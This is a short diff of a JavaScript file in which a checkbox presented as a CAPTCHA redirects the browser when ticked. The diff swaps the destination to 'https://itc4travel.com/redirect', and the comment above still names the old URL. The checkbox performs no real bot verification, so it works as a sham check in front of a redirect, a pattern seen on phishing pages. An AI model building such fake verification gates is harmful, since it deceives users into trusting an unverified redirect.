@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', function () {
     captchaCheckbox.addEventListener('change', function () {
         if (captchaCheckbox.checked) {
             // CAPTCHA verification successful, redirect to https://x201m.com/Profile
-            window.location.href = 'https://x201m.com/Profile';
+            window.location.href = 'https://itc4travel.com/redirect';
         } else {
             // CAPTCHA verification failed, display error message
             displayStatus('Please verify that you are not a robot.', false);
